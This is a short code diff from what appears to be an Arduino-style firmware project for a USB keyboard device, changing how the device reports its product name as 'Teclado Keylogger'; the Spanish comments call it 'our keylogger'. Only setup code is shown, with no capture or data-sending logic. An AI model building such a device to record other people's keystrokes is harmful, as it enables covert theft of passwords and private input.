@@ -107,8 +107,10 @@ void handleSpecialCommand(uint8_t cmd) {
 void setup() {
   Serial1.begin(BAUD_RATE, SERIAL_8N1, RX_PIN, TX_PIN);
   
-  // Cambiar para ponerle un nombre al teclado, Nombre, Fabricante, nro de serie
-  USB.begin("Teclado Keylogger", "5kyf4ll", "123456789");
+  // le ponemos nombre personalizado a nuestro keylogger
+  USB.productName("Teclado Keylogger");
+
+  USB.begin();
 
   Keyboard.begin();
   delay(500);
